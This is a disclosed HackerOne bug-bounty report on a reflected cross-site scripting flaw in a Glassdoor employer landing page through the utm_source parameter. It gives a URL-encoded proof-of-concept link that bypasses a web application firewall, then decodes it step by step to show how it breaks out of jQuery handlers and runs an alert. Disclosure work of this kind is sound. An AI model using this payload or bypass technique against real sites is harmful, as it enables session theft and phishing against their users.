# Reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/

## Report Details
- **Report ID**: 846338
- **URL**: https://hackerone.com/reports/846338
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-04-10T10:16:52.521Z
- **Disclosed**: 2020-05-22T15:17:02.452Z

## Reporter
- **Username**: parzel
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: glassdoor

## Vulnerability Information
**Summary:**
There is a reflected XSS on https://www.glassdoor.com/employers/sem-dual-lp/ through the utm_source parameter. By using URL encoding I was able to bypass the WAF.

Affected URL or select Asset from In-Scope:
https://www.glassdoor.com/

Affected Parameter:
utm_source

Vulnerability Type:
XSS

Browsers tested:
Firefox 75.0

## Steps To Reproduce:
  1. Visit the following POC link:
```
https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
```

## Explanation
The utm_source parameter is not escaped properly for URL encoded values. We can escape at multiple locations in the source. I escaped in the script section. The payload finished open function calls from jQuery, executes an alert as POC and then finished the original script tag. Basically we can dissect it as follows:
```
abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e

is url encoded for

abc`;return+false});});alert`xss`;</script>

which is used like

abc`;                       Finish the string
return+false});      Finish the jQuery click function
});                            Finish the jQuery ready function
alert`xss`;              Here we can execute our code
</script>               This closes the script tag to prevent JavaScript parsing errors
```

## Supporting Material/References (screenshots, logs, videos):
{F782251}

## Impact

A XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user. This can be abused to steal session cookies, perform requests in the name of the victim or for phishing attacks.

## Attachments
- Screenshot_from_2020-04-10_12-08-05.png
